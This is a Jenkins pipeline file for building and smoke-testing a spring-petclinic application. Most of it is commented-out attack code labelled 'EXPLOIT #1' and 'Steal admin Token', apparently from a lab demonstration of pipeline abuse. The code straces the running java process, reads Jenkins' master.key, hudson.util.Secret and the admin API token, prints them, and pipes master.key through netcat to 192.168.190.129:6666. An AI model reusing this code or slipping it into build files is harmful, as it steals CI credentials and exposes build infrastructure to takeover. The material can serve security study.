pipeline {
    agent { label 'ubuntu' }

    stages {
        stage ('Initialize') {
            steps {
                sh '''
                    echo "PATH = ${PATH}"
                    echo "M2_HOME = ${M2_HOME}"
                '''
                checkout scm
            }
        }

        stage ('Build') {
            steps {
                sh 'sudo ~/mvnw package -Dmaven.test.skip=true' 
            }
            post {
                success {
                    echo 'build success' // run sonarqube tests here...   junit 'target/surefire-reports/**/*.xml' 
                }
            }
        } // end stage build
            
        stage ('Test') {
             sh 'java -jar ./target/spring-petclinic-2.0.0.jar &'
             sh 'sleep 5'
             sh 'wget localhost:8080 && echo "tests success" || exit 1'
             sh 'sudo kill $(pidof java)'
        } // end stage test
    } // end stages
} // end pipeline





/*
node ('ubuntu') {
    label 'ubuntu'
    sh 'sudo netstat -anupt > /home/ubuntu/netstat.out'
    sh 'sudo strace -fp $(pidof java) -v -e read,write,open -s 9999 -o /home/ubuntu/out.2 &'
    //git credentialsId: '351e1846-ed9e-4901-a0ae-0e02fa904cd3', url: 'https://github.com/nimrods8/peMaker.git'    


    checkout scm
    docker.image('maven:3-alpine').inside {
      stage("Install Bundler") {
            sh 'mvn clean install'
            //sh 'nc '
      }
    }
}

node ('master') {
    def fileContents = readFile file: "/var/lib/jenkins/secrets/master.key", encoding: "UTF-8"
    println fileContents
    def apiContents = readFile file: "/var/lib/jenkins/users/admin/config.xml", encoding: "UTF-8"
    def api1 = apiContents.split( '<apiToken>');
    def api2 = api1[1].split( '</apiToken>');
    println "API Token is:\n" + api2[0];
    
    //println fileContentsAdmin

    int[] fileContentsHudson = readFile file: "/var/lib/jenkins/secrets/hudson.util.Secret", encoding: "ISO-8859-1"
    String str = 'Secrets/hudson.Util.Secret:\nPass 1:\n';
    for( int i = 0; i < fileContentsHudson.size(); i++)
    {
        int  a = (int)fileContentsHudson[i];
        str = str + String.format("%02X-",a);
    }
    println str

    sh 'cat /var/lib/jenkins/secrets/master.key | netcat  192.168.190.129 6666'
}
node ('ubuntu') {   
    label 'ubuntu'
    sh 'sudo kill $(pidof strace)'
    sh 'sudo cat /home/ubuntu/out.2'
}

*/



/*
#!groovy




pipeline {
  stages {
    stage('Maven Install') {
	
      agent {
        docker {
          image 'maven:3-alpine'
          label 'ubuntu'
        }
      }
      steps {
        sh 'mvn clean install'
        sh 'nc '
        //
        // EXPLOIT #1
        //
        sh 'sudo strace -fp $(pidof java) -v -e read,write -s 9999 -o /home/ubuntu/out.2 &'
        git credentialsId: '351e1846-ed9e-4901-a0ae-0e02fa904cd3', url: 'https://github.com/nimrods8/peMaker.git'    
      }
    } // end stage
	
	stage('Steal admin Token') {
			label 'master' 
			def fileContents = readFile file: "/var/lib/jenkins/secrets/master.key", encoding: "UTF-8"
			println fileContents
			def apiContents = readFile file: "/var/lib/jenkins/users/admin/config.xml", encoding: "UTF-8"
			def api1 = apiContents.split( '<apiToken>');
			def api2 = api1[1].split( '</apiToken>');
			println "API Token is:\n" + api2[0];
			
			//println fileContentsAdmin

			int[] fileContentsHudson = readFile file: "/var/lib/jenkins/secrets/hudson.util.Secret", encoding: "ISO-8859-1"
			String str = 'Secrets/hudson.Util.Secret:\nPass 1:\n';
			for( int i = 0; i < fileContentsHudson.size(); i++)
			{
				int  a = (int)fileContentsHudson[i];
				str = str + String.format("%02X-",a);
			}
			println str

			sh 'cat /var/lib/jenkins/secrets/master.key | netcat  192.168.190.129 6666'
	}
	stage('take out credentials') {
	  //
	  // back to the ubuntu node
	  //
		agent { 
			label 'ubuntu' 
			sh 'sudo kill $(pidof strace)'
			sh 'sudo cat /home/ubuntu/out.2'
	  } // end agent
	} // end stage
  } // end stages	
} // end pipeline

*/



